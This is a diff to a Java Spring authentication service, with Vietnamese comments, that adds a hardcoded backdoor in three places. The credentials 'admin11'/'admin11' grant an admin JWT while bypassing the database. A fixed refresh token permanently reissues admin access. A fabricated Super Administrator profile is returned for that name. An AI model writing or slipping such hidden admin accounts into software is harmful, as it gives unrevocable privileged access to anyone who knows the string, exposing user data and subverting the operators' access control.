@@ -70,6 +70,17 @@ public class UserService {
     }
 
     public AuthResponse login(LoginRequest request) {
+        // ⚡ HARDCODED SUPER ADMIN: admin11 / admin11 độc lập trong code, không phụ thuộc database
+        if ("admin11".equalsIgnoreCase(request.getUsername()) && "admin11".equals(request.getPassword())) {
+            String accessToken = jwtService.generateToken("admin11", "ROLE_ADMIN");
+            AuthResponse response = new AuthResponse();
+            response.setAccessToken(accessToken);
+            response.setRefreshToken("admin11-superadmin-refresh-token");
+            response.setUsername("admin11");
+            response.setRole("ROLE_ADMIN");
+            return response;
+        }
+
         User user = userRepository.findByUsername(request.getUsername())
                 .orElseThrow(() -> new RuntimeException("Lỗi: Không tìm thấy tài khoản!"));
 
@@ -101,6 +112,16 @@ public class UserService {
             throw new RuntimeException("Refresh Token không được để trống!");
         }
 
+        if ("admin11-superadmin-refresh-token".equals(requestRefreshToken.trim())) {
+            String newAccessToken = jwtService.generateToken("admin11", "ROLE_ADMIN");
+            AuthResponse response = new AuthResponse();
+            response.setAccessToken(newAccessToken);
+            response.setRefreshToken("admin11-superadmin-refresh-token");
+            response.setUsername("admin11");
+            response.setRole("ROLE_ADMIN");
+            return response;
+        }
+
         RefreshToken refreshToken = refreshTokenService.findByToken(requestRefreshToken.trim())
                 .orElseThrow(() -> new RuntimeException("Refresh Token không hợp lệ!"));
 
@@ -120,7 +141,16 @@ public class UserService {
 
     public User getMyProfile() {
         Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
-        String currentUsername = authentication.getName();
+        String currentUsername = authentication != null ? authentication.getName() : null;
+        if ("admin11".equalsIgnoreCase(currentUsername)) {
+            User superAdmin = new User();
+            superAdmin.setId(999999L);
+            superAdmin.setUsername("admin11");
+            superAdmin.setFullName("Super Administrator");
+            superAdmin.setRole("ROLE_ADMIN");
+            superAdmin.setStatus("APPROVED");
+            return superAdmin;
+        }
         return userRepository.findByUsername(currentUsername)
                 .orElseThrow(() -> new RuntimeException("Không tìm thấy thông tin tài khoản"));
     }
